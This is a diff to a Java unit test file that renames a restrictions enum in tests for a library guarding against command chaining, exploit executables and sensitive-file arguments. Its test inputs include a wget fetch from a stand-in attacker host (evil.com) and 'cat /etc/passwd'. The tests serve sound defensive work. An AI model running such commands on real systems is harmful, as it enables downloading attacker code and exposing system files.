@@ -40,7 +40,7 @@ final class SystemCommandTest {
         "\t"
       })
   void it_allows_innocent_commands(final String cmd) throws IOException {
-    SystemCommand.runCommand(rt, cmd, Set.of(SystemCommand.Restrictions.PREVENT_COMMAND_CHAINING));
+    SystemCommand.runCommand(rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
   }
 
   @Test
@@ -62,7 +62,7 @@ final class SystemCommandTest {
   @Test
   void it_allows_banned_executables_if_turned_off() throws IOException {
     SystemCommand.runCommand(
-        rt, "wget http://evil.com/", Set.of(SystemCommand.Restrictions.PREVENT_COMMAND_CHAINING));
+        rt, "wget http://evil.com/", Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
   }
 
   @ParameterizedTest
@@ -78,7 +78,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, cmd, Set.of(SystemCommand.Restrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
+                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
   }
 
   @ParameterizedTest
@@ -99,13 +99,13 @@ final class SystemCommandTest {
             SystemCommand.runCommand(
                 rt,
                 cmd,
-                Set.of(SystemCommand.Restrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
+                Set.of(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
   }
 
   @Test
   void it_allows_sensitive_files_if_turned_off() throws IOException {
     SystemCommand.runCommand(
-        rt, "cat /etc/passwd", Set.of(SystemCommand.Restrictions.PREVENT_COMMAND_CHAINING));
+        rt, "cat /etc/passwd", Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
   }
 
   @ParameterizedTest
@@ -126,7 +126,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, oneStringCommand, Set.of(SystemCommand.Restrictions.PREVENT_COMMAND_CHAINING)));
+                rt, oneStringCommand, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
   }
 
   @Test
@@ -136,7 +136,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, cmd, Set.of(SystemCommand.Restrictions.PREVENT_COMMAND_CHAINING)));
+                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
   }
 
   @Test
@@ -146,7 +146,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, cmd, Set.of(SystemCommand.Restrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
+                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
   }
 
   @Test
@@ -158,7 +158,7 @@ final class SystemCommandTest {
             SystemCommand.runCommand(
                 rt,
                 cmd,
-                Set.of(SystemCommand.Restrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
+                Set.of(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
   }
 
   @Test
@@ -169,7 +169,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, cmd, envp, Set.of(SystemCommand.Restrictions.PREVENT_COMMAND_CHAINING)));
+                rt, cmd, envp, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
   }
 
   @Test
@@ -184,6 +184,6 @@ final class SystemCommandTest {
                 cmd,
                 envp,
                 new File("."),
-                Set.of(SystemCommand.Restrictions.PREVENT_COMMAND_CHAINING)));
+                Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
   }
 }
